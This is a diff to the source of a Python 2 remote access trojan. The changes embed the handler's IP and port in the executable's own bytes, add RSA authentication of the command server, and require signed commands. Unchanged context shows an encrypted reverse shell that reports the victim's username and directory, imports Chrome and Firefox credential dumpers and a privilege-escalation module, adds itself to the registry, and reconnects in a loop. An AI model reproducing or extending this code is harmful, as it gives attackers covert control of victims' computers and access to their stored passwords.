@@ -1,13 +1,34 @@
 #!/usr/bin/env python2
-import socket, subprocess, os, threading, json, base64, datetime, getpass, time, hashlib, random, psutil, zlib, glob, select, sys, Queue, ctypes, string, wmi
+import socket, subprocess, os, threading, json, base64, datetime, getpass, time, hashlib, psutil, zlib, glob, select, sys, Queue, ctypes, string, wmi
 from Crypto.Cipher import AES
+from Crypto.PublicKey import RSA
+from Crypto.Random import random
 from twisted.internet import reactor
 from twisted.protocols import socks
-import dumpff
+import dumpff, traceback
+import hashlib
 if os.name =="nt":
 	import dumpchrome, win32net, pupy_privesc
 
-HANDLER_IP = "127.0.0.1"
+try:
+	print sys.frozen
+	with open(sys.argv[0], "rb") as f:
+		f.seek(972)
+		HANDLER_IP = ""
+		for i in range(4):
+			HANDLER_IP += str(ord(f.read(1)))+"."
+		port1 = ord(f.read(1))
+		port2 = ord(f.read(1))
+		HANDLER_PORT = int(str(hex(port1)[2:].zfill(2))+str(hex(port2)[2:].zfill(2)), 16)
+		HANDLER_IP = HANDLER_IP[:-1]
+except Exception as e:
+	traceback.print_stack()
+	print e
+	HANDLER_IP = "127.0.0.1"
+	HANDLER_PORT = 8080
+	
+print HANDLER_IP
+print HANDLER_PORT
 c = wmi.WMI()
 
 def windows_only(func):
@@ -36,7 +57,6 @@ class Transport:
 	def package(self, data):
 		package = {}
 		package["cwd"] = base64.b64encode(os.getcwd())
-		package["ip"] = base64.b64encode("192.168.1.355")
 		package["data"] = base64.b64encode(data)
 		package["username"] = base64.b64encode(getpass.getuser())
 		package["localtime"] = base64.b64encode(datetime.datetime.now().strftime("%H:%M:%S"))
@@ -67,6 +87,8 @@ class EncryptedReverseTCP(Transport):
 		Transport.__init__(self, handler_ip, handler_port)
 		self.comm_socket = socket.socket()
 		
+		self.server_public_key = RSA.importKey(base64.b64decode("MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDG3CRcM4aUy1FF9swDXMVsYdfH2+l+Z1uXaYs/Y9VP2z7s9VOC+NTmeDAVYyZ2fk0dgzverOIDdj0Dol8cRzT3GMgZ+WESgLKc5dLuvMWTX6zIn1zcrGmkTy3+eh1YKpXbPueRVqlwYl/u6APDIYhoQS9wyf2qYMoyjoOA0YXlCQIDAQAB"))
+		
 	def gen_diffie_key(self):
 		modulus = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA237327FFFFFFFFFFFFFFFF
 		base = 2
@@ -86,12 +108,26 @@ class EncryptedReverseTCP(Transport):
 		print key, IV
 	
 		return key, IV
+		
+	def authenticate(self):
+		plainstring = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(32))
+		print "Challenging server with "+plainstring
+		encstring = self.server_public_key.encrypt(plainstring, 32)
+		self.comm_socket.sendall(encstring[0])
+		
+		response = self.comm_socket.recv(1024)
+		
+		if plainstring == response:
+			return True
+		return False
 
 	def connect(self):
 		self.comm_socket.connect((self.handler_ip, self.handler_port))
 		
 		key, IV = self.gen_diffie_key()
 		self.aes_obj = AES.new(key, AES.MODE_CFB, IV)
+		
+		if not self.authenticate(): raise Exception("Server failed to authenticate!")
 		
 	def encrypt(self, data):
 		return base64.b64encode(self.compress(self.aes_obj.encrypt(data)))
@@ -116,7 +152,10 @@ class EncryptedReverseTCP(Transport):
 			c = self.comm_socket.recv(4096)
 			if not c: raise Exception("Handler disconnected")
 			data += c
+		signature, data = data.split(":")
+		signature = base64.b64decode(signature)
 		data = self.decrypt(data)
+		if not self.server_public_key.verify(hashlib.sha224(data).hexdigest(), (int(signature),)): raise Exception("Could not verify signature")
 		return data
 
 class StoppableThread(threading.Thread):
@@ -393,7 +432,8 @@ class Shell:
 				return("Succesfully added file to current user's registry.")
 				
 		return "Failed to add file to registry."
-		
+	
+	@windows_only
 	def get_service_list(self):
 		services = c.Win32_Service()
 		service_paths = []
@@ -455,7 +495,7 @@ class Shell:
 			if not arguments:
 				output = "Set to one or more values: cwd, ip, data, hostname, username, localtime; or use preset: minimal, small, userathost"
 			else:
-				output = self.set_package_items(arguments)
+				output = self.transport.set_package_items(arguments)
 		elif command == "cd":
 			output = self.change_directory(arguments)
 		elif command == "LIST_FILES":
@@ -508,7 +548,7 @@ class Shell:
 			
 while True:
 	try:
-		shell = Shell(EncryptedReverseTCP(HANDLER_IP, 8080))
+		shell = Shell(EncryptedReverseTCP(HANDLER_IP, HANDLER_PORT))
 		shell.transport.connect()
 		shell.run()
 	except Exception as e:
